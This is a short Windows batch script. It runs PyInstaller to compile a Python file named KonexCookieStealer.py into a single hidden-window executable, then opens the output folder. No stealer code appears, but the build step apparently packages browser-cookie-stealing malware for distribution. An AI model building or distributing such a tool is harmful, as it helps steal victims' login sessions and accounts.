@echo off

cls
pyinstaller --onefile --noconfirm --specpath %temp% --distpath .\Compiled --workpath %temp% --windowed KonexCookieStealer.py

explorer .\Compiled
